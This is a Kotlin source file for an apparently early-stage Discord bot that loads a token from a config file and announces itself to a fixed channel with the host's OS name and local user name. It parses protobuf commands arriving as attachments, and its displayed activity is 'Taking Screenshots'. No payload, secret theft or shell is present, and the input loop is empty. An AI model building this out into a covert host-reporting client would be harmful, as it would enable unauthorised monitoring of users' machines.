import net.dv8tion.jda.api.JDABuilder
import net.dv8tion.jda.api.entities.Activity
import net.dv8tion.jda.api.events.ReadyEvent
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import net.dv8tion.jda.api.hooks.ListenerAdapter
import net.dv8tion.jda.api.requests.GatewayIntent
import kotlin.random.Random
import com.google.protobuf.Any as ProtobufAny


object XBoardApp : ListenerAdapter(), TyperXView {
    private val config = ConfigProperties("capture.prop").apply {
        loadProps()
    }

    val jda by lazy {
        JDABuilder.createLight(
        config["discord_bot_id"],
        GatewayIntent.GUILD_MESSAGES,
        GatewayIntent.DIRECT_MESSAGES
    ).addEventListeners(XBoardApp).apply {
        setBulkDeleteSplittingEnabled(false)
        setActivity(Activity.watching("Taking Screenshots"))
    }.build()
    }

    val updatesChannel by lazy { jda.getTextChannelById(876910605225836614)!! }
    val requestsChannel by lazy { jda.getTextChannelById(876910144028553306)!! }
    val  deviceId= Random.nextInt(10000)
    @JvmStatic
    fun main(args: Array<String>) {
        val dt= jda.toString()
       println("Meh!")
    }

    override fun onMessageReceived(event: MessageReceivedEvent) {
        val msg = event.message
        val attachment = msg.attachments[0]
        val input = attachment.retrieveInputStream().get()
        val message = Message.parseFrom(input)
        processMessage(message)
    }
    override fun onReady(event: ReadyEvent) {
      println("""
          Automated Bot connected! sending Join Event
      """.trimIndent())
        sendJoinInfo()
        inputLoop()
    }

    private fun sendJoinInfo() {
        val joinPayload =
            JoinPayload.newBuilder().setId(deviceId).setDeviceType(System.getProperty("os.name"))
                .setName("${System.getProperty("user.name")}'s Pc")
        val pack = ProtobufAny.pack(joinPayload.build())
        val message = Message.newBuilder()
            .setId(deviceId)
            .setMessageType(MessageType.UPDATE_JOIN)
            .setMessagePayload(pack).build()
        sendMessage(message)
    }

    private fun sendMessage(message: Message) =
        updatesChannel.sendFile(message.toByteArray(), "protobuff.bin").queue()

    private fun processMessage(message: Message){
        when(message.messageType){
            MessageType.UPDATE_JOIN ->{
                val unpack = message.messagePayload.unpack(JoinPayload::class.java)
                println("User Joined ${unpack.name} ")
            }
        }

    }

    private fun inputLoop(){

    }


    override fun startUI() = Unit
    override fun stopUI() = Unit
    override fun setProgress(progress: Int) = Unit
    override fun setStatus(status: String?) = Unit

}